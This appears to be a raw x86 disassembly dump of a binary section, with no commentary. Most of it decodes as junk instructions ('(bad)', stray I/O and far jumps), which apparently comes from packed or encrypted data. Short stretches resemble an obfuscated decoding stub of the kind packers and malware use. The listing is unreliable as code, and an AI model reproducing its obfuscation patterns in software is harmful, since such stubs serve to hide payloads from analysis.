  4106db:	aad    0x86
  4106dd:	and    bl,BYTE PTR [ebp-0x2035b800]
  4106e3:	sbb    BYTE PTR [esi],dl
  4106e5:	inc    ecx
  4106e6:	dec    edx
  4106e7:	(bad)  
  4106e8:	repz sub esp,DWORD PTR [ecx-0x3d43c0c1]
  4106ef:	jo     0x41069c
  4106f1:	push   ebx
  4106f2:	out    0xf8,eax
  4106f4:	jg     0x410681
  4106f6:	mov    bl,0xc9
  4106f8:	fs push edi
  4106fa:	fsub   QWORD PTR [ebx+0x23]
  4106fd:	push   0x17b25bb9
  410702:	(bad)  
  410703:	cld    
  410704:	mov    cl,BYTE PTR [edi+0x5ce531ca]
  41070a:	ja     0x410695
  41070c:	xor    eax,DWORD PTR [ebx+eiz*2+0x5a8db383]
  410713:	nop
  410714:	in     eax,dx
  410715:	(bad)  ss:[edx]
  410718:	inc    ecx
  410719:	hlt    
  41071a:	popa   
  41071b:	out    dx,al
  41071c:	loopne 0x41078e
  41071e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41071f:	jbe    0x41074f
  410721:	mov    bh,0xb7
  410723:	pop    edx
  410724:	aaa    
  410725:	sub    DWORD PTR [edi],eax
  410727:	outs   dx,BYTE PTR ds:[esi]
  410728:	xchg   esi,eax
  410729:	loopne 0x4106e5
  41072b:	sub    bh,BYTE PTR [edi]
  41072d:	scas   eax,DWORD PTR es:[edi]
  41072e:	jo     0x4106e5
  410730:	pop    es
  410731:	popf   
  410732:	in     eax,0x9b
  410734:	xchg   ecx,eax
  410735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410736:	aaa    
  410737:	jb     0x410749
  410739:	push   ds
  41073a:	test   BYTE PTR fs:[ebx-0x19e51cf],dl
  410741:	jbe    0x4106f0
  410743:	popa   
  410744:	push   eax
  410745:	jle    0x410737
  410747:	jge    0x41075a
  410749:	dec    esi
  41074a:	mov    ecx,?
  41074c:	xchg   edx,eax
  41074d:	outs   dx,BYTE PTR ds:[esi]
  41074e:	or     al,0x24
  410750:	inc    edx
  410751:	sbb    eax,0xaa186cf3
  410756:	arpl   bx,bx
  410758:	test   DWORD PTR [edi-0x60],edi
  41075b:	sar    esi,0x39
  41075e:	push   eax
  41075f:	inc    esi
  410760:	xor    ebx,DWORD PTR [eax]
  410762:	xchg   ebx,eax
  410763:	add    eax,0x44cbbc14
  410768:	pextrw ecx,(bad),0xc5
  41076a:	mov    dh,BYTE PTR [ecx+0x61]
  41076d:	jmp    0x4107a3
  41076f:	das    
  410770:	lods   eax,DWORD PTR ds:[esi]
  410771:	js     0x4107ea
  410773:	jns    0x41076f
  410775:	pushf  
  410776:	int3   
  410777:	pusha  
  410778:	jp     0x410758
  41077a:	adc    dl,BYTE PTR [eax+0x40]
  41077d:	cmp    al,0x6e
  41077f:	mov    eax,ds:0x1d63404f
  410784:	adc    BYTE PTR [ecx-0x7b6c94fd],0x49
  41078b:	xchg   esi,eax
  41078c:	pop    es
  41078d:	cmp    DWORD PTR [ecx-0x6c],eax
  410790:	idiv   BYTE PTR [esi+0x5c]
  410793:	cmp    al,0x2a
  410795:	inc    esi
  410796:	mov    esi,DWORD PTR [ebp+0x8]
  410799:	mov    ecx,0x327299
  41079e:	jmp    0x410959
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	xor    edx,esp
  4107b1:	inc    esi
  4107b2:	fcom   DWORD PTR [ecx+eax*2]
  4107b5:	jle    0x410835
  4107b7:	pushf  
  4107b8:	jg     0x410838
  4107ba:	jle    0x410767
  4107bc:	pop    ebx
  4107bd:	xor    BYTE PTR [edi-0x45899af4],ch
  4107c3:	(bad)  
  4107c4:	jns    0x4107d8
  4107c6:	inc    edx
  4107c7:	dec    DWORD PTR [edx+0x3f]
  4107ca:	xor    ch,BYTE PTR [ebx-0x4c]
  4107cd:	sub    ecx,DWORD PTR [eax+0x5e]
  4107d0:	repnz stc 
  4107d2:	lods   al,BYTE PTR ds:[esi]
  4107d3:	cmp    cl,cl
  4107d5:	in     eax,0x5e
  4107d7:	pusha  
  4107d8:	mov    dl,0xa9
  4107da:	cmp    BYTE PTR [esp+edi*2],ah
  4107dd:	adc    DWORD PTR [ebx-0x44],edx
  4107e0:	pushf  
  4107e1:	pop    ebx
  4107e2:	gs fs jmp 0x10f5:0x4f7d7ad7
  4107eb:	fld    DWORD PTR [ebx]
  4107ed:	das    
  4107ee:	aad    0x21
  4107f0:	retf   0xe0f7
  4107f3:	test   DWORD PTR [edi-0x4be6b356],edi
  4107f9:	daa    
  4107fa:	xor    ah,BYTE PTR [ebp-0x1f6ff58c]
  410800:	(bad)  
  410801:	jno    0x410802
  410803:	stos   DWORD PTR es:[edi],eax
  410804:	mov    ch,0x80
  410806:	pop    ebp
  410807:	mul    BYTE PTR [ebp+0x56]
  41080a:	jmp    0xc6f425e
  41080f:	fisttp WORD PTR [esi]
  410811:	dec    ebp
  410812:	mov    ecx,ebx
  410814:	sub    BYTE PTR [edi],al
  410816:	inc    esp
  410817:	inc    ebp
  410818:	inc    esi
  410819:	add    dh,0x86
  41081c:	mov    WORD PTR [esi+0x4b],es
  41081f:	cmp    cl,dl
  410821:	mov    ch,0x87
  410823:	and    ebx,edx
  410825:	inc    ebx
  410826:	push   0x22
  410828:	test   BYTE PTR [edx+0x4b124464],cl
  41082e:	xor    cl,al
  410830:	and    cl,bl
  410832:	popf   
  410833:	jecxz  0x410881
  410835:	leave  
  410836:	xor    ebp,DWORD PTR [edi+ebp*1]
  410839:	(bad)
  41083c:	cmc    
  41083d:	cmc    
  41083e:	lock mov ebp,0xacf501f1
  410844:	loop   0x410838
  410846:	cli    
  410847:	jbe    0x4107d2
  410849:	jecxz  0x410845
  41084b:	shr    BYTE PTR [eax-0x56510fae],cl
  410851:	daa    
  410852:	fisttp QWORD PTR [ebp+0x28]
  410855:	jno    0x4108ce
  410857:	pop    edx
  410858:	out    dx,eax
  410859:	clc    
  41085a:	jae    0x41083d
  41085c:	sbb    al,0xe7
  41085e:	in     al,0xf8
  410860:	pop    eax
  410861:	aas    
  410862:	mov    ebx,0x8b049ad1
  410867:	hlt    
  410868:	sub    al,0x7
  41086a:	mov    al,0xe0
  41086c:	das    
  41086d:	jp     0x41086f
  41086f:	xor    BYTE PTR [edx],0xd9
  410872:	imul   esp,DWORD PTR [ebp+edx*4+0x34675172],0x2441fada
  41087d:	xor    BYTE PTR ds:0xbb0bbcef,0xe3
  410884:	sub    BYTE PTR [edx],bl
  410886:	mov    bl,0xda
  410888:	pop    ds
  410889:	jae    0x410853
  41088b:	mov    al,ds:0xba59100d
  410890:	inc    ecx
  410891:	add    al,0x92
  410893:	pusha  
  410894:	and    al,0x4c
  410896:	sbb    al,0x1f
  410898:	loop   0x4108cd
  41089a:	pop    edi
  41089b:	scas   al,BYTE PTR es:[edi]
  41089c:	aaa    
  41089d:	and    esi,edi
  41089f:	jle    0x4108e1
  4108a1:	xchg   ecx,eax
  4108a2:	jecxz  0x4108a7
  4108a4:	add    DWORD PTR [ebp+0x51],eax
  4108a7:	pop    ebp
  4108a8:	jmp    0x71ec:0xd882a416
  4108af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108b0:	arpl   WORD PTR [eax+0x654040a2],sp
  4108b6:	cld    
  4108b7:	mov    esi,0x3c8a3b97
  4108bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108bd:	mov    fs,WORD PTR [ebx+0x2ed57b48]
  4108c3:	div    edx
  4108c5:	in     eax,0x14
  4108c7:	popf   
  4108c8:	cmp    BYTE PTR [eax+0x42],ch
  4108cb:	xchg   esp,eax
  4108cc:	inc    ecx
  4108cd:	adc    esp,DWORD PTR [ebx-0x3d9cb49d]
  4108d3:	sbb    al,0x8f
  4108d5:	xchg   edi,eax
  4108d6:	add    al,BYTE PTR [edi+0x5b21f522]
  4108dc:	pop    ss
  4108dd:	fisub  WORD PTR [ebx+0x624cc44a]
  4108e3:	or     al,0x33
  4108e5:	fdivp  st(1),st
  4108e7:	iret   
  4108e8:	loope  0x410903
  4108ea:	and    eax,0x86eceeee
  4108ef:	push   cs
  4108f0:	mov    DWORD PTR ss:[ebp-0xb1362bf],esi
  4108f7:	fwait
  4108f8:	aaa    
  4108f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108fa:	pop    ebp
  4108fb:	fwait
  4108fc:	sub    al,0xbf
  4108fe:	ja     0x41090f
  410900:	jmp    0x49eb:0x74ed20f8
  410907:	cmp    ch,BYTE PTR [esi]
  410909:	sub    esp,DWORD PTR [edi]
  41090b:	pop    esp
  41090c:	dec    esi
  41090d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41090e:	fsubp  st(1),st
  410910:	fdiv   st,st(3)
  410912:	scas   al,BYTE PTR es:[edi]
  410913:	ja     0x41094f
  410915:	sbb    BYTE PTR [esi],ch
  410917:	call   0xd9db:0x48466d2d
  41091e:	lods   al,BYTE PTR ds:[esi]
  41091f:	xchg   edx,eax
  410920:	in     eax,dx
  410921:	cmp    bl,al
  410923:	or     DWORD PTR [ebx],edi
  410925:	mov    ebp,ebx
  410927:	pop    es
  410928:	cmp    ebx,esp
  41092a:	sbb    ch,BYTE PTR ds:0x347a8e0b
  410930:	rol    DWORD PTR [ebp+0x78f22f36],1
  410936:	mov    DWORD PTR [ecx-0x276b87c0],0x1eed5c9d
  410940:	xchg   ebx,eax
  410941:	call   0x3302d933
  410946:	cld    
  410947:	push   0x3a
  410949:	sti    
  41094a:	push   0xffffffe0
  41094c:	clc    
  41094d:	xor    ebp,DWORD PTR [eax-0x6d]
  410950:	ss (bad) 
  410952:	div    DWORD PTR [eax+eax*2-0x312bfbe4]
  410959:	add    eax,ecx
  41095b:	cmp    DWORD PTR [esi+0x54],eax
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
  410991:	and    DWORD PTR ds:0x43466f,0x0
  41099b:	mov    eax,ds:0x43466f
  4109a0:	inc    eax
  4109a1:	mov    ds:0x43466f,eax
  4109a6:	cmp    DWORD PTR ds:0x43466f,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x43466f,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x43466f
  4109db:	inc    eax
  4109dc:	mov    ds:0x43466f,eax
  4109e1:	cmp    DWORD PTR ds:0x43466f,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x43474f
  4109f5:	adc    DWORD PTR ds:0x434663,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x43473b,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434687,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
  410a2d:	ret    0x59db
  410a30:	(bad)  
  410a31:	stos   BYTE PTR es:[edi],al
  410a32:	inc    edx
  410a33:	jle    0x410ab3
  410a35:	popf   
  410a36:	js     0x410ab6
  410a38:	jle    0x4109c3
  410a3a:	fchs   
  410a3c:	mov    dl,0x4f
  410a3e:	pop    eax
  410a3f:	xchg   edi,eax
  410a40:	xchg   edx,eax
  410a41:	xor    BYTE PTR ds:0x5c07d337,dl
  410a47:	stos   BYTE PTR es:[edi],al
  410a48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a49:	ficom  DWORD PTR [edi-0x55]
  410a4c:	loopne 0x410a61
  410a4e:	xchg   edi,eax
  410a4f:	sbb    eax,DWORD PTR [ebx-0x1450251b]
  410a55:	dec    edx
  410a56:	jmp    0x634d:0xbcf92e05
  410a5d:	test   al,0xbc
  410a5f:	inc    edi
  410a60:	lahf   
  410a61:	retf   
  410a62:	inc    esp
  410a63:	test   eax,0xd70f03df
  410a68:	and    DWORD PTR [edi+0x38],eax
  410a6b:	mov    ecx,0xd607f2ef
  410a70:	mov    bl,0x5a
  410a72:	or     ah,BYTE PTR [eax+ebp*1-0x66a4442f]
  410a79:	push   0x56c05023
  410a7e:	ret    
  410a7f:	fidiv  WORD PTR [ebx]
  410a81:	sbb    bl,BYTE PTR [ecx]
  410a83:	call   0x7088d7d0
  410a88:	push   0xffffffed
  410a8a:	sub    BYTE PTR [eax+ebx*1+0x734e13fa],0x9d
  410a92:	jno    0x410a20
  410a94:	mov    cs,WORD PTR [esi+ebp*8-0x1056a6cd]
  410a9b:	ds scas eax,DWORD PTR es:[edi]
  410a9d:	sbb    al,0xd8
  410a9f:	fcom   QWORD PTR [eax]
  410aa1:	xchg   edx,eax
  410aa2:	jecxz  0x410add
  410aa4:	data16 sub al,ch
  410aa7:	inc    edx
  410aa8:	mov    al,0xeb
  410aaa:	jne    0x410ac4
  410aac:	and    DWORD PTR [eax],eax
  410aae:	sbb    al,0x30
  410ab0:	xor    ah,dl
  410ab2:	xor    DWORD PTR [ebx],edx
  410ab4:	sub    DWORD PTR [ecx+0x73035b0d],eax
  410aba:	pop    ebp
  410abb:	hlt    
  410abc:	cld    
  410abd:	rcl    BYTE PTR [edi-0x25],0x90
  410ac1:	rcl    BYTE PTR [ebx+esi*2-0x2be2aa0d],cl
  410ac8:	push   ebp
  410ac9:	pusha  
  410aca:	jmp    0xaa67:0x4265bea4
  410ad1:	sar    BYTE PTR [edx+eiz*4],1
  410ad4:	jo     0x410aab
  410ad6:	add    eax,DWORD PTR [ecx+0x505f74af]
  410adc:	dec    esi
  410add:	mov    esp,0x6535d1cb
  410ae2:	or     BYTE PTR [ebp-0x74],0xdd
  410ae6:	push   ecx
  410ae7:	pop    ebp
  410ae8:	pushf  
  410ae9:	fnsave [ebx+0x40]
  410aec:	pop    edi
  410aed:	adc    eax,DWORD PTR es:[edx-0x32]
  410af1:	xchg   DWORD PTR [ebx],esi
  410af3:	or     BYTE PTR [ebp-0x58ab043b],bl
  410af9:	int    0xbd
  410afb:	ret    0x3963
  410afe:	pop    esi
  410aff:	mov    ch,bl
  410b01:	xlat   BYTE PTR ds:[ebx]
  410b02:	loope  0x410b7f
  410b04:	push   cs
  410b05:	jmp    0xec92:0x330efd01
  410b0c:	and    ch,BYTE PTR [esi-0x4c]
  410b0f:	test   al,0x97
  410b11:	or     eax,0x16428432
  410b16:	sar    BYTE PTR [edx+0x750cabc3],0x44
  410b1d:	imul   esp,DWORD PTR [edi+0x1e],0x39
  410b21:	sbb    DWORD PTR [ecx],ebx
  410b23:	inc    esi
  410b24:	mov    ch,0xd1
  410b26:	push   ebx
  410b27:	mov    BYTE PTR [edx+0x10],0xec
  410b2b:	int    0xda
  410b2d:	cwde   
  410b2e:	push   es
  410b2f:	or     cl,al
  410b31:	mov    bh,0xc3
  410b33:	and    DWORD PTR [eax+ebp*8-0x45],0xffffff95
  410b38:	ja     0x410b6f
  410b3a:	(bad)  
  410b3b:	cmp    DWORD PTR [ebp-0x47],ebp
  410b3e:	jno    0x410ad2
  410b40:	dec    BYTE PTR [eax+0x7e42cb39]
  410b46:	inc    ebx
  410b47:	ror    DWORD PTR [ebp+0x7e43492a],1
  410b4d:	cmp    al,0xd0
  410b4f:	sbb    DWORD PTR [ecx+ebp*8],eax
  410b52:	push   ss
  410b53:	pop    edi
  410b54:	out    0xa9,eax
  410b56:	iret   
  410b57:	push   eax
  410b58:	les    ecx,FWORD PTR [eax+edx*1-0x2c]
  410b5c:	in     al,0x22
  410b5e:	inc    esi
  410b5f:	push   ecx
  410b60:	push   esp
  410b61:	and    esp,DWORD PTR [esi-0x75]
  410b64:	fdiv   QWORD PTR [edi-0x60]
  410b67:	adc    ebp,DWORD PTR [ebp+edi*8-0x3a]
  410b6b:	repnz sti 
  410b6d:	shl    BYTE PTR [ebx+0x3464ee87],cl
  410b73:	iret   
  410b74:	rol    BYTE PTR [ebp-0x3fd46171],0x70
  410b7b:	ins    BYTE PTR es:[edi],dx
  410b7c:	jmp    0x410b4a
  410b7e:	test   DWORD PTR [ebx],edx
  410b80:	mov    cx,0x6ee4
  410b84:	enter  0xc6ef,0x48
  410b88:	cdq    
  410b89:	mov    DWORD PTR [edx-0x4cb089f9],ebp
  410b8f:	stos   BYTE PTR es:[edi],al
  410b90:	rcl    ah,1
  410b92:	test   BYTE PTR [ebp-0x32],cl
  410b95:	push   esp
  410b96:	and    edx,DWORD PTR [edi]
  410b98:	test   DWORD PTR [esi+0x18],esi
  410b9b:	inc    esp
  410b9c:	cmp    al,0xbc
  410b9e:	fs jnp 0x410bb7
  410ba1:	ja     0x410b28
  410ba3:	adc    al,0xd9
  410ba5:	adc    BYTE PTR [edi+ecx*4-0x333c4968],bl
  410bac:	ds xchg edx,eax
  410bae:	push   eax
  410baf:	mov    dh,0x2b
  410bb1:	pop    ebx
  410bb2:	mov    al,0x47
  410bb4:	mov    ds:0x10ecd165,al
  410bb9:	jno    0x410b7d
  410bbb:	and    bl,cl
  410bbd:	adc    ebp,ecx
  410bbf:	push   ecx
  410bc1:	sbb    eax,0x86537f7a
  410bc6:	nop
  410bc7:	out    dx,al
  410bc8:	test   BYTE PTR [edx],bl
  410bca:	and    al,0x99
  410bcc:	stos   DWORD PTR es:[edi],eax
  410bcd:	ret    0xbfe9
  410bd0:	ja     0x410bb3
  410bd2:	xor    eax,0x54f24c4e
  410bd7:	add    DWORD PTR ds:0x4e7b3eef,0x94111537
  410be1:	pop    edi
  410be2:	dec    esi
  410be3:	sbb    ah,bl
  410be5:	mov    esp,0x8f0ad5ef
  410bea:	lock call 0x1bb8:0xc6b6b1c
  410bf2:	(bad)  
  410bf3:	retf   0xd2f0
  410bf6:	or     DWORD PTR [edx+0x65620481],ebx
  410bfc:	sub    ch,BYTE PTR [edi+0x45]
  410bff:	pop    ebx
  410c00:	mov    ecx,0x3df6ba0b
  410c05:	test   DWORD PTR [ecx-0xf42d07],edi
  410c0b:	jb     0x410c10
  410c0d:	mov    esi,0x2668a019
  410c12:	(bad)  [eax+0x7644c674]
  410c18:	or     al,bl
  410c1a:	stos   DWORD PTR es:[edi],eax
  410c1b:	iret   
  410c1c:	arpl   WORD PTR [edx],bp
  410c1e:	ds stos DWORD PTR es:[edi],eax
  410c20:	push   ss
  410c21:	(bad)  
  410c22:	shl    eax,cl
  410c24:	iret   
  410c25:	jmp    0x410c6a
  410c27:	mov    eax,ds:0xd2b23e05
  410c2c:	aam    0xdb
  410c2e:	into   
  410c2f:	xor    BYTE PTR [edx],dh
  410c31:	jb     0x410cb1
  410c33:	jae    0x410c93
  410c35:	in     eax,0xd6
  410c37:	sbb    DWORD PTR [ecx+0x4e],eax
  410c3a:	shl    DWORD PTR [esi],cl
  410c3c:	ins    BYTE PTR es:[edi],dx
  410c3d:	in     al,0xd4
  410c3f:	adc    DWORD PTR [edi],ecx
  410c41:	scas   eax,DWORD PTR es:[edi]
  410c42:	jge    0x410c36
  410c44:	ins    DWORD PTR es:[edi],dx
  410c45:	out    0xb5,al
  410c47:	out    dx,eax
  410c48:	adc    BYTE PTR [ebx],dl
  410c4a:	mov    eax,ds:0x19877cfd
  410c4f:	cmp    eax,0x6171b907
  410c54:	(bad)  
  410c55:	or     BYTE PTR [ecx+edx*4+0x67],ah
  410c59:	adc    ch,dh
  410c5b:	jp     0x410cc3
  410c5d:	and    DWORD PTR [edx],esi
  410c5f:	bnd jb 0x410c8e
  410c62:	dec    edx
  410c63:	push   ebx
  410c64:	(bad)  
  410c65:	cdq    
  410c66:	in     al,dx
  410c67:	mov    al,0xa7
  410c69:	cld    
  410c6a:	and    BYTE PTR [ebp+0x43],bl
  410c6d:	jne    0x410cbe
  410c6f:	sahf   
  410c70:	or     eax,0xe0cd8d39
  410c75:	jb     0x410c78
  410c77:	mov    bh,0xac
  410c79:	clc    
  410c7a:	mov    edx,0x5f27e69c
  410c7f:	push   cs
  410c80:	inc    esi
  410c81:	sbb    al,BYTE PTR [esp+eax*8+0x444db26f]
  410c88:	repz repz jns 0x410c2a
  410c8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c8d:	dec    ebx
  410c8e:	out    0xe3,eax
  410c90:	pop    eax
  410c91:	fwait
  410c92:	mov    dh,BYTE PTR [ebp-0x7]
  410c95:	or     eax,0x3dbe3571
  410c9a:	and    ebx,DWORD PTR [ebx]
  410c9c:	ins    DWORD PTR es:[edi],dx
  410c9d:	bound  eax,QWORD PTR [esi+edx*2+0x2e649700]
  410ca4:	and    BYTE PTR [esi+0x26289758],al
  410caa:	push   ecx
  410cab:	mov    edx,0xbd3c6c20
  410cb0:	xchg   esi,eax
  410cb1:	push   esi
  410cb2:	mov    al,ds:0x79d57da5
  410cb7:	cmp    DWORD PTR [ebx+0x5110f75d],ecx
  410cbd:	dec    esi
  410cbe:	add    eax,0x23ea2e0a
  410cc3:	sbb    dh,dh
  410cc5:	lds    edi,FWORD PTR [eax+0x1f]
  410cc8:	sub    al,0x11
  410cca:	scas   eax,DWORD PTR es:[edi]
  410ccb:	mov    eax,ds:0x5b7dfb4f
  410cd0:	test   eax,0x1e984c9b
  410cd5:	jo     0x410c83
  410cd7:	cmp    al,0x89
  410cd9:	dec    ebp
  410cda:	adc    BYTE PTR [ebx+0x4347470d],cl
  410ce0:	add    bh,al
  410ce2:	inc    ebp
  410ce3:	or     BYTE PTR [edx-0x38f0cb32],bh
  410ce9:	inc    ebp
  410cea:	cld    
  410ceb:	cmp    eax,0x8bf89c85
  410cf0:	or     eax,0x434663
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43478b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434793,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x434747,0x434703
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434787,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43470f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx+0x1a96953b],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410dac
  410d7a:	mov    ebx,0xeca8d812
  410d7f:	ds dec ebx
  410d81:	in     eax,dx
  410d82:	out    dx,eax
  410d83:	push   eax
  410d84:	hlt    
  410d85:	ja     0x410e05
  410d87:	mov    ds:0x511a8e4b,eax
  410d8c:	lods   eax,DWORD PTR ds:[esi]
  410d8d:	test   al,0x27
  410d8f:	xor    BYTE PTR [edx],ch
  410d91:	(bad)  
  410d92:	iret   
  410d93:	sub    DWORD PTR [esi-0x1bb262dd],edx
  410d99:	and    al,0x79
  410d9b:	jle    0x410d67
  410d9d:	and    BYTE PTR [esi+0x6a2c5d5a],al
  410da3:	ins    BYTE PTR es:[edi],dx
  410da4:	pop    ebx
  410da5:	div    DWORD PTR [esi-0x70]
  410da8:	pop    esi
  410da9:	xchg   esp,eax
  410daa:	cwde   
  410dab:	cdq    
  410dac:	(bad)  
  410dae:	stc    
  410daf:	mov    DWORD PTR [edx+0x16],eax
  410db2:	div    BYTE PTR [edx]
  410db4:	fcom   QWORD PTR [ecx-0x74b03e5e]
  410dba:	imul   cl
  410dbc:	cmp    eax,0x86851672
  410dc1:	inc    ebx
  410dc2:	mov    al,0x4e
  410dc4:	xchg   ebp,eax
  410dc5:	repz pusha 
  410dc7:	and    ecx,DWORD PTR [ebx+0x5a]
  410dca:	mov    ebp,DWORD PTR [eax-0x2a]
  410dcd:	into   
  410dce:	dec    esi
  410dd0:	jo     0x410daf
  410dd2:	dec    esi
  410dd3:	lahf   
  410dd4:	jle    0x410e16
  410dd6:	pop    edi
  410dd7:	mov    WORD PTR [eax],ss
  410dd9:	jmp    0xd538f43e
  410dde:	sub    DWORD PTR [eax],ebp
  410de0:	adc    BYTE PTR [esi+0x6f],0xad
  410de4:	mov    ds:0x3cfd9eda,al
  410de9:	es or  eax,0x25a1c9ec
  410def:	inc    ecx
  410df0:	and    eax,0x45f69e34
  410df5:	sub    edi,DWORD PTR [edx+esi*8+0x213c168a]
  410dfc:	fadd   st(2),st
  410dfe:	sub    eax,0x15ca4f2f
  410e03:	mov    al,0x19
  410e05:	sbb    eax,0x6383ded3
  410e0a:	jno    0x410df4
  410e0c:	sbb    BYTE PTR [edi],cl
  410e0e:	data16 stc 
  410e10:	rol    DWORD PTR [ecx+edi*4+0x13c876b7],0x2d
  410e18:	push   edx
  410e19:	aad    0x7e
  410e1b:	test   edx,edi
  410e1d:	iretw  
  410e1f:	cmp    BYTE PTR [ecx+eiz*8+0x77bef0d5],al
  410e26:	cs scas al,BYTE PTR es:[edi]
  410e28:	or     BYTE PTR [edi-0x599dcab],0x96
  410e2f:	fwait
  410e30:	sub    esp,DWORD PTR [ebx-0x59]
  410e33:	popf   
  410e34:	sahf   
  410e35:	push   edi
  410e36:	dec    esp
  410e37:	mov    al,0xb6
  410e39:	popf   
  410e3a:	(bad)  
  410e3c:	jl     0x410e20
  410e3e:	mov    eax,0xf3cf66f4
  410e43:	iret   
  410e44:	repz xor edx,DWORD PTR [ebx]
  410e47:	fwait
  410e48:	out    dx,al
  410e49:	lahf   
  410e4a:	ficomp WORD PTR [ecx-0x5d]
  410e4d:	mov    bh,0x71
  410e4f:	jge    0x410dd7
  410e51:	scas   al,BYTE PTR es:[edi]
  410e52:	arpl   WORD PTR [edx+0x64a3abd8],ax
  410e58:	je     0x410e56
  410e5a:	push   0x6a03f47e
  410e5f:	outs   dx,BYTE PTR ds:[esi]
  410e60:	ret    0x2d4a
  410e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e64:	lds    edx,FWORD PTR [ecx-0x15137778]
  410e6a:	add    DWORD PTR [edi+ebx*4],edx
  410e6d:	push   0xffffff96
  410e6f:	xchg   ebp,eax
  410e70:	cs jb  0x410e22
  410e73:	xchg   esi,eax
  410e74:	shl    DWORD PTR ds:0x8e6be366,1
  410e7a:	xor    edi,DWORD PTR ds:0x2b266726
  410e80:	int3   
  410e81:	fmul   st(7),st
  410e83:	fwait
  410e84:	dec    edi
  410e85:	inc    edi
  410e86:	jmp    FWORD PTR [ecx]
  410e88:	xor    BYTE PTR [ebx],bl
  410e8a:	mov    DWORD PTR [ecx-0x4],ebp
  410e8d:	jno    0x410ea5
  410e8f:	inc    esi
  410e90:	pop    ebp
  410e91:	into   
  410e92:	aam    0x69
  410e94:	push   0xdc2aae17
  410e99:	push   edi
  410e9a:	xlat   BYTE PTR ds:[ebx]
  410e9b:	ret    0xef3e
  410e9e:	add    DWORD PTR [eax],0x2bd3edd5
  410ea4:	push   edx
  410ea5:	outs   dx,BYTE PTR ds:[esi]
  410ea6:	leave  
  410ea7:	ja     0x410e69
  410ea9:	sar    DWORD PTR [ecx],0x55
  410eac:	and    ebp,DWORD PTR [eax+0xa]
  410eaf:	add    eax,0xae1742be
  410eb4:	jp     0x410e77
  410eb6:	ds fcmovnbe st,st(6)
  410eb9:	call   0xdbfdc1ff
  410ebe:	push   es
  410ebf:	mul    DWORD PTR [esi]
  410ec1:	sbb    DWORD PTR [edi+0x2c4d305a],ecx
  410ec7:	jecxz  0x410ebc
  410ec9:	xor    eax,0x72140b49
  410ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ecf:	jns    0x410f27
  410ed1:	jne    0x410ea6
  410ed3:	jne    0x410ee3
  410ed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ed6:	xchg   esp,eax
  410ed7:	xor    bh,BYTE PTR [esp+ecx*1]
  410eda:	push   ss
  410edb:	fisubr DWORD PTR [edx+ebx*2]
  410ede:	add    DWORD PTR [eax+ebp*1-0x23],edi
  410ee2:	call   0x755:0x738af726
  410ee9:	jp     0x410e74
  410eeb:	cwde   
  410eec:	add    dl,bl
  410eee:	pop    ecx
  410eef:	mov    al,ds:0x9bf1917c
  410ef4:	jbe    0x410ebd
  410ef6:	addr16 sub eax,0x39f6a2c0
  410efc:	enter  0xc096,0x8f
  410f00:	xchg   edx,eax
  410f01:	(bad)  
  410f02:	and    al,BYTE PTR [eax]
  410f04:	xor    al,0x9b
